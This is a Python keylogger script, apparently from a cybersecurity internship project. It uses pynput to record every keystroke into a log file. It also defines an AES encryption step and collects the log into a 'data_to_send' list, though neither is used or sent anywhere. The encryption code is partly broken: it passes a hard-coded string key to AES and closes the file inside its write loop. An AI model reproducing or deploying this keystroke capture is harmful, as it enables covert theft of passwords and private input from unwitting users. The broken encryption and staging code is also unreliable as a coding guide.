#Keylogger

from pynput.keyboard  import Key, Listener                   #This module lets us control the keyboard and type things out.
import time                                                  #This module lets us pause our program so we can see what's happening.
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64


#for storing the information 
keys_information="key_log.txt"



keys_information_e="e_key_log.txt"


key="PeWm9P5ogqf_8cpgfn-bvRgaW5JvM8jwk-xlGWYVrtM="
#giving the path 
file_path="D:\Documents\Prodigy Internship Project(Cyber Security)\PRODIGY_CS_04"

#for extend the path
extend="\\"
file_marge=file_path + extend

# Define the file paths
key_log_path = file_path+extend+keys_information




#making the constant
count=0
keys=[]
time_iteration=2
number_of_itration_end=3



  

number_of_itration=0
current_time=time.time()
stopping_time=time.time() + time_iteration

while number_of_itration < number_of_itration_end:
    

    #making the on_press funtion for add the keys in to the list
    def on_press(key):
        global keys,count,current_time  #we have make the keys and count varibale global because they can be accessable any where in the funtion
        
        print(key)
        keys.append(key)    #this we append the key taken from user to the keys list
        count+=1            #if the  user press any key then it will increase by one
        if count>=1:        #if  the count is greater than or equal to 1 that means a complete sequence has been made so write
            count =0        
            write_file(keys)  
            keys=[]
        current_time=time.time()


    #making the write_file function to write keys in key_log file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k=str(key).replace("'","") #here we are replace the ' comma because now it show hello otherwise it will show like 'h' 'e''l''o'
                if k.find("space") >0:                    #checking whether space is pressed or not
                    f.write('\n')           #if yes then new line will be added after writing the text
                    f.close()
                elif k.find("Key") ==-1:
                    f.write(k)
                    f.close()
                
                
    #making the on_release function to quit the keylogger           
    def on_release(key):
        if key == Key.esc: #if  esc is pressed then it will stop the listener
            return False #stoping the listner
        if current_time >stopping_time:
            return False
                
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
        
        number_of_itration +=1
        current_time=time.time()
        stopping_time=time.time() + time_iteration
        
        
# Function to encrypt data using AES
def encrypt_data(data):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv, ct
# Gather all data
data_to_send = []

# Encrypt and add text files
for text_file in [keys_information]:
    with open(file_path + extend + text_file, 'rb') as f:
        data = f.read()
        data_to_send.append((text_file, data))
    

time.sleep(10)